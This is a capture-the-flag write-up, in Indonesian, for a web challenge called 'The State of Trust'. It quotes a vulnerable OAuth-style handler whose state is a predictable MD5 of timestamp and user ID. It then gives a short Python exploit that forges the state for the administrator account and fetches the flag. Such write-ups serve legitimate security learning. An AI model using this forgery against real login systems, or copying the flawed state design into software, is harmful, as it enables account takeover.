# The State of Trust

| | |
|---|---|
| **Bagian** | wave 8 |
| **Kategori** | web |
| **Jumlah Solve** | 62 |

## Ikhtisar

Bureau of Trust menerapkan login bergaya OAuth. Salinan pengembangan pengendali status diekspos di `/source.py.bak`, dan panggilan balik memercayai `user_id` yang disediakan klien. Implementasi yang relevan adalah:

```python
def make_state(user_id: int) -> str:
    return hashlib.md5(f"{int(time.time())}:{user_id}".encode()).hexdigest()

def verify_state_for(user_id: int, submitted_state: str,
                     skew_seconds: int = 300) -> bool:
    now = int(time.time())
    for offset in range(-skew_seconds, skew_seconds + 1):
        expected = hashlib.md5(
            f"{now + offset}:{user_id}".encode()
        ).hexdigest()
        if submitted_state == expected:
            return True
    return False
```

Oleh karena itu, statusnya dapat diprediksi, dan `verify_state_for` adalah satu-satunya pemeriksaan panggilan balik. Tidak ada pengikatan sisi server antara status dan sesi browser.

## Penyelesaian

Lobi hanya tertaut ke tamu, auditor, dan bendahara, tetapi panggilan balik menerima `user_id` apa pun. Akun administratornya adalah `user_id=1`. Setelah menukar token tim untuk suatu sesi, buat status untuk stempel waktu saat ini dan untuk pengguna 1, lalu langsung tekan callback:

```python
import hashlib, time, requests

s = requests.Session()
# First exchange the team token at /session/exchange, as the sign-in page does.
state = hashlib.md5(f"{int(time.time())}:1".encode()).hexdigest()
s.get("https://state-of-trust.pointeroverflowctf.com/auth/callback"
      f"?user_id=1&state={state}")
print(s.get("https://state-of-trust.pointeroverflowctf.com/flag").text)
```

Callback menyimpan `sot_user_id=1`, sehingga sesi tersebut sekarang menjadi administrator. Dasbor `/admin` memperlihatkan tombol Trust Seal, yang memanggil `/flag` dan mengembalikan bendera. Flag yang diterima adalah `████████████████`.